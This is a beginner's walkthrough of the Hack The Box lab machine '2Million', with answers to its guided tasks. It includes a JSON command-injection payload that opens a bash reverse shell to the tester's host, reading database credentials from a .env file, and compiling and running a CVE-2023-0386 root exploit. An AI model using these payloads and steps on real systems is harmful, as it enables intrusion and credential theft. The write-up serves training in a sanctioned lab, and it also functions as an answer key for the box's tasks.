---
id: 949
title: "2million HTB walkthrough"
created: 2024-12-03T18:05:46+00:00
url: https://hacklido.com/blog/949-2million-htb-walkthrough
words: 1931
---

# 2million HTB walkthrough

[image]

It’s been a very long time since I last dived into a Hack The Box machine, but today, we’re back with a fun and exciting journey into “2 Million,” an easy retired HTB machine. In this write-up, we’ll be tackling the machine in guided mode—a straightforward and structured approach designed to help beginners like me to follow along with solid steps while enjoying the steep learning curve. Let’s gear up and dive into this box together.

## Initial Access

### Task 1: How many TCP ports are open?

```
`┌─[us-dedivip-1]─[10.10.14.72]─[mccleod1290@htb-zjn9n4winb]─[~]
└──╼ [★]$ nmap -p- --min-rate 10000 10.129.254.214
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 09:10 CST
Nmap scan report for 2million.htb (10.129.254.214)
Host is up (0.0093s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 4.87 seconds`
```

Answer:

```
`2`
```

### Task 2: What is the name of the JavaScript file loaded by the `/invite` page that has to do with invite codes?

Step one, visit and check /invite

step 2: check browser console, check out network tab we see an request made to an js file, and this is our answer.

[image]

Answer:

```
`inviteapi.min.js`
```

### Task 3: What JavaScript function on the invite page returns the first hint about how to get an invite code? Don’t include () in the answer.

Step 1 visit the `inviteapi.min.js` and then understand the code with chatgpt, you will get answer for the following three tasks.

[image]

Answer:

```
`http://2million.htb/js/inviteapi.min.js`
```

### Task 4: The endpoint in `makeInviteCode` returns encrypted data. That message provides another endpoint to query. That endpoint returns a `code` value that is encoded with what very common binary to text encoding format. What is the name of that encoding?

This task involves in numerous steps from understanding the code, to making an request to getting the invite code let’s break down each step by step.

Step 1:

Analysing the code and understanding via chatgpt we see two important functions and they are

```
`eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))`
```

[image]

[image]

[image]

Step 2:

If we send `post` request to these endpoints we get our responses and one of the response has flag.

[image]

[image]

We can see, that the above endpoint gives us an `base64` encoded value which is our answer.

We can use this invite code to sign up as user!!

Answer:

```
`base64`
```

### Task : 5 What is the path to the endpoint the page uses when a user clicks on “Connection Pack”?

Look around the website and in this url we can access the connection pack.

```
`http://2million.htb/home/access`
```

[image]

The following is the embeded link for `connection pack`.

```
`http://2million.htb/api/v1/user/vpn/generate`
```

### Task 6: How many API endpoints are there under `/api/v1/admin`?

We see that there are 3 endpoints for admin and we can get this by sending `GET` request to `/api/v1` or using this curl command

```
`curl -X GET "http://2million.htb/api/v1" -H "Cookie: PHPSESSID=135culru6kejajj86ta2n6nh27" | jq`
```

[image]

answer

```
`3`
```

### Task 7: What API endpoint can change a user account to an admin account?

Answer:

```
`/api/v1/admin/settings/update`
```

For some unknown reasons, we are unable to get any positive response from `/api/v1/admin/*` , we tried changing request from `GET` to `POST` but nothing works. Let’s have an look at `/api/v1/user/*` and first let’s check `/api/v1/user/auth`

[image]

We see data returned in json, which mean application accepts json, so let’s try some attacks by injection something malicious in json. Now we have valid input of json data to add to our http parameters.

```
`{"loggedin":true,"username":"userhello","is_admin":0}`
```

### Task 8: What API endpoint has a command injection vulnerability in it?

Answer:

```
`/api/v1/admin/vpn/generate`
```

But when we try to access this endpoint we get `HTTP/1.1 405 Method Not Allowed` in burp response. So let’s try `/api/v1/user/vpn/generate`

[image]

We can see that by copying the json data from previous task, and changing the content type to `application/json` we are able to achieve command injection, just make sure that the endpoint is accessed via `POST` !!

Getting Shell

Now open terminal and listen on port 443

```
`sudo nc -nlvp 443`
```

Now in burp suit change the json part of http request to following payload and you should get your reverse shell.

```
`{"loggedin":true,"username":"; bash -c 'bash -i >& /dev/tcp/10.10.14.94/443 0>&1' ;","is_admin":0}`
```

### Task 9 :What file is commonly used in PHP applications to store environment variable values?

After getting shell let’s look around we find `.env` in system we get an user and password, let’s re- use the username and password for ssh.

```
`www-data@2million:/home/admin$ ls
ls
user.txt
www-data@2million:/home/admin$ cd /var/www/html
cd /var/www/html
www-data@2million:~/html$ ls
ls
Database.php
Router.php
VPN
assets
controllers
css
fonts
images
index.php
js
views
www-data@2million:~/html$ ls -la
ls -la
total 56
drwxr-xr-x 10 root root 4096 Dec  2 17:40 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Dec  2 17:40 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123`
```

```
`ssh admin@10.129.254.214`
```

### Task 10: Submit the flag located in the admin user’s home directory.

```
`cat user.txt`
```

## Privilege Escalation

### Task 11 What is the email address of the sender of the email sent to admin?

Usually mail configuration is located in `/var/mail` let’s have an look at that folder and see if something is interesting.

[image]

Answer:

```
`ch4p@2million.htb`
```

### Task 12: What is the 2023 CVE ID for a vulnerability in that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits?

[image]

Answer:

```
`CVE-2023-0386`
```

### Task 13: Submit the flag located in root’s home directory.

Step1:

First let’s have an look at the proof of concept for this exploit. We will be using  https://github.com/sxlmnwb/CVE-2023-0386 https://github.com/sxlmnwb/CVE-2023-0386 to gain privileges, and if you look closely this contains a lot of files and folder, so either compress it into zip or download it as an zip file itself.

Step2:

Then using `scp` let’s upload the file into the victim machine.

```
`sshpass -p SuperDuperPass123 scp CVE-2023-0386-main.zip admin@10.129.206.206:/tmp/`
```

Now we should have the exploit code in zip file on `/tmp` folder.

Step 3:

Unzip the code, and compile the exploit, have an look at `README.md` for compiling the code.

```
`admin@2million:/tmp$ unzip CVE-2023-0386-main.zip Archive: CVE-2023-0386-main.zip c4c65cefca1365c807c397e953d048506f3de195 creating: CVE-2023-0386-main/ inflating: CVE-2023-0386-main/Makefile ...[snip]... inflating: CVE-2023-0386-main/test/mnt.c

admin@2million:/tmp$ cd CVE-2023-0386-main/

admin@2million:/tmp/CVE-2023-0386-main$ make all gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl fuse.c: In function ‘read_buf_callback’: fuse.c:106:21: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘off_t’ {aka ‘long int’} [-Wformat=] 106 | printf("offset %d\n", off); | ~^ ~~~ ...[snip].. /usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common': (.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking gcc -o exp exp.c -lcap gcc -o gc getshell.c`
```

Step 4:

In the first session, I’ll run the next command from the instructions:

```
`admin@2million:/tmp/CVE-2023-0386-main$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0`
```

Open another terminal, since we are on cli, we have to start another `ssh` session on the target.

```
`ssh admin@10.129.254.214`
```

Now in this terminal type in this command, and we should be root user.

```
`admin@2million:/tmp/CVE-2023-0386-main$ ./exp uid:1000 gid:1000 [+] mount success total 8 drwxrwxr-x 1 root root 4096 Jun 2 23:11 . drwxrwxr-x 6 root root 4096 Jun 2 23:11 .. -rwsrwxrwx 1 nobody nogroup 16096 Jan 1 1970 file [+] exploit success! To run a command as administrator (user "root"), use "sudo <command>". See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386-main#`
```

```
`root@2million:/# cat /root/root.txt`
```

## Beyond Root

### Task 14: [Alternative Priv Esc] What is the version of the GLIBC library on TwoMillion?

```
`admin@2million:~$ ldd --version
ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.`
```

Answer:

```
`2.35`
```

### Task 15: [Alternative Priv Esc] What is the CVE ID for the 2023 buffer overflow vulnerability in the GNU C dynamic loader?

[image]

Answer:

```
`CVE-2023-4911`
```

### Task 16: [Alternative Priv Esc] With a shell as admin or www-data, find a POC for Looney Tunables. What is the name of the environment variable that triggers the buffer overflow? After answering this question, run the POC and get a shell as root.

Repeat the step in task 13, this time for `cve-2023-4911` exploit poc, and you should get root.

Answer:

```
`GLIBC_TUNABLES`
```

[image]
